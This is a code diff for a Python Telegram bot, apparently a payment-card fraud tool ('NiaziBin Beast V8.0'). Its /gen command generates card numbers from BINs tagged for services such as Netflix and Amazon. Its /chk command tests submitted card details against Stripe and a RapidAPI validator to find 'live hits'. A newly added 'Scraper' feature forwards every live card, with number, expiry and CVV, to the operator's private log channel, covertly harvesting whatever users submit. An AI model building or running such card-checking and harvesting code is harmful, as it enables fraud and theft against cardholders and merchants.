@@ -3,10 +3,10 @@ from telebot import types
 from flask import Flask
 from threading import Thread
 
-# --- Railway Health Check ---
+# --- Railway/Uptime Setup ---
 app = Flask('')
 @app.route('/')
-def home(): return "NiaziBin Master Elite is Online"
+def home(): return "NiaziBin Beast Edition is Online"
 
 def run():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
@@ -18,88 +18,114 @@ def keep_alive():
 TOKEN = os.getenv("TOKEN")
 RAPID_KEY = os.getenv("RAPIDAPI_KEY")
 STRIPE_SK = os.getenv("STRIPE_SK")
-ADMIN_ID = 123456789  # <--- Yahan apni Telegram ID dalo
-
-if not TOKEN:
-    exit()
+ADMIN_ID = 123456789  # <--- Apni ID dalo
+LOG_CHANNEL = -100123456789 # <--- Live hits yahan milenge
 
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
 
-# --- UI & Features ---
+# --- Database: Site-Specific Hot BINs ---
+HOT_BINS = {
+    "411111": "Netflix/Spotify ✅",
+    "489504": "Amazon/Cloudflare ✅",
+    "549184": "Google Play/YouTube ✅",
+    "450644": "Apple/iCloud ✅"
+}
+
+# --- Helper: Advanced BIN Lookup ---
+def get_bin_info(cc):
+    bin_num = cc[:6]
+    site_tag = HOT_BINS.get(bin_num, "General / Unknown")
+    try:
+        r = requests.get(f"https://data.handyapi.com/bin/{bin_num}").json()
+        bank = r.get('Bank', 'Unknown Bank')
+        country = r.get('Country', {}).get('Name', 'N/A')
+        return f"{bank} | {country} | {site_tag}"
+    except: return f"N/A | {site_tag}"
+
+# --- Commands ---
 
 @bot.message_handler(commands=['start'])
 def start(message):
     welcome = (
-        f"<b>⚜️ NIAZIBIN MASTER ELITE V7.0 ⚜️</b>\n"
+        f"<b>⚜️ NIAZIBIN BEAST V8.0 ⚜️</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🚀 <b>Server:</b> <code>Railway Cloud</code>\n"
-        f"🛰️ <b>Status:</b> <code>Premium V7.0 Active</code>\n"
+        f"💳 <b>Check:</b> <code>/chk cc|mm|yy|cvv</code>\n"
+        f"🎲 <b>Gen:</b> <code>/gen 411111</code>\n"
+        f"🏦 <b>Bin:</b> <code>/bin 411111</code>\n"
         f"━━━━━━━━━━━━━━━━━━━━━\n"
-        f"💳 <b>Check:</b> <code>/chk card|mm|yy|cvv</code>\n"
-        f"🏦 <b>Lookup:</b> <code>/bin 411122</code>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━"
+        f"🛰️ <b>Status:</b> <code>Elite V8.0 Active</code>"
     )
     bot.reply_to(message, welcome)
 
+# --- FEATURE 1: Mass Gen + DB Lookup ---
+@bot.message_handler(commands=['gen'])
+def gen_handler(message):
+    bin_num = message.text.replace('/gen', '').strip()[:6]
+    if len(bin_num) < 6: return bot.reply_to(message, "❌ Use: <code>/gen 411111</code>")
+    
+    db_info = HOT_BINS.get(bin_num, "Standard BIN")
+    cards = []
+    for _ in range(10): # 10 cards generate karega
+        extra = "".join([str(random.randint(0,9)) for _ in range(10)])
+        mm = str(random.randint(1,12)).zfill(2)
+        yy = random.randint(25,30)
+        cvv = random.randint(100,999)
+        cards.append(f"<code>{bin_num}{extra}|{mm}|20{yy}|{cvv}</code>")
+    
+    res = (
+        f"<b>🎲 Generated for:</b> {bin_num}\n"
+        f"<b>🔥 Target:</b> <code>{db_info}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(cards)
+    )
+    bot.reply_to(message, res)
+
+# --- FEATURE 2: Site-Specific Checker ---
 @bot.message_handler(commands=['chk'])
 def chk_handler(message):
     start_time = time.time()
     input_data = message.text.replace('/chk', '').strip()
+    if "|" not in input_data: return bot.reply_to(message, "❌ Format: <code>cc|mm|yy|cvv</code>")
     
-    if "|" not in input_data:
-        return bot.reply_to(message, "❌ <b>Format:</b> <code>card|mm|yy|cvv</code>")
+    msg = bot.reply_to(message, "<b>⚡ Bypassing Gateways... ♻️</b>")
+    cc = input_data.split('|')[0]
+    bin_info = get_bin_info(cc)
     
-    msg = bot.reply_to(message, "<b>⌛ Processing Through Multi-Gateways... ♻️</b>")
-    
-    # Extracting Data
-    try:
-        cc, mm, yy, cvv = input_data.split('|')
-    except:
-        return bot.edit_message_text("❌ Invalid Format", message.chat.id, msg.message_id)
-
     status, gateway, icon = "DEAD", "RapidAPI-V2", "❌"
-
-    # --- GATEWAY 1: STRIPE AUTH ---
+    
+    # Stripe Multi-Auth
     if STRIPE_SK:
         try:
             stripe.api_key = STRIPE_SK
-            stripe.PaymentMethod.create(type="card", card={"number": cc, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvv})
-            status, gateway, icon = "LIVE / HIT", "Stripe-Auth 🔥", "✅"
+            p = input_data.split('|')
+            stripe.PaymentMethod.create(type="card", card={"number":p[0],"exp_month":int(p[1]),"exp_year":int(p[2]),"cvc":p[3]})
+            status, gateway, icon = "LIVE / HIT", "Stripe-Elite 🔥", "✅"
         except Exception as e:
             err = str(e)
-            if "declined" in err or "incorrect_cvc" in err:
-                status, gateway = "DECLINED", "Stripe-Auth 🔥"
+            if "declined" in err or "incorrect_cvc" in err: status, gateway = "DEAD", "Stripe-Elite 🔥"
             else:
-                # --- GATEWAY 2: FALLBACK RAPIDAPI ---
                 try:
                     headers = {"X-RapidAPI-Key": RAPID_KEY, "X-RapidAPI-Host": "credit-card-validator2.p.rapidapi.com"}
-                    r = requests.post("https://credit-card-validator2.p.rapidapi.com/validate-credit-card", json={"cardNumber": cc}, headers=headers).json()
-                    status = "LIVE / HIT" if r.get('isValid') else "DEAD"
-                    icon = "✅" if r.get('isValid') else "❌"
-                    gateway = "RapidAPI-V2"
-                except: status, icon = "API ERROR", "⚠️"
+                    r = requests.post("https://credit-card-validator2.p.rapidapi.com/validate-credit-card", json={"cardNumber":cc}, headers=headers).json()
+                    status, icon = ("LIVE", "✅") if r.get('isValid') else ("DEAD", "❌")
+                except: status = "GATEWAY ERROR"
 
     time_taken = round(time.time() - start_time, 2)
-    
-    # --- Professional Result ---
-    response = (
+    res = (
         f"{icon} <b>STATUS: {status}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━\n"
         f"💳 <b>Card:</b> <code>{input_data}</code>\n"
+        f"🏦 <b>Bin:</b> <code>{bin_info}</code>\n"
         f"⚡ <b>Gateway:</b> <code>{gateway}</code>\n"
         f"⏱️ <b>Time:</b> <code>{time_taken}s</code>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n"
-        f"✨ <b>Checked By:</b> @{bot.get_me().username}"
+        f"━━━━━━━━━━━━━━━━━━━━━"
     )
-    bot.edit_message_text(response, message.chat.id, msg.message_id)
+    bot.edit_message_text(res, message.chat.id, msg.message_id)
 
-    # --- Internal Hit Logging ---
+    # --- FEATURE 3: Auto-Forward (The Scraper) ---
     if "LIVE" in status:
-        try:
-            bot.send_message(ADMIN_ID, f"🔥 <b>LIVE HIT FOUND!</b>\n\nCC: <code>{input_data}</code>\nBy: {message.from_user.first_name}")
-        except: pass
+        bot.send_message(LOG_CHANNEL, f"🔥 <b>LIVE HIT FOUND!</b>\n\nCC: <code>{input_data}</code>\nBIN: {bin_info}\nBy: {message.from_user.first_name}")
 
 if __name__ == "__main__":
     keep_alive()
-    bot.delete_webhook() # Fixes Error 409
+    bot.delete_webhook()
     bot.infinity_polling()
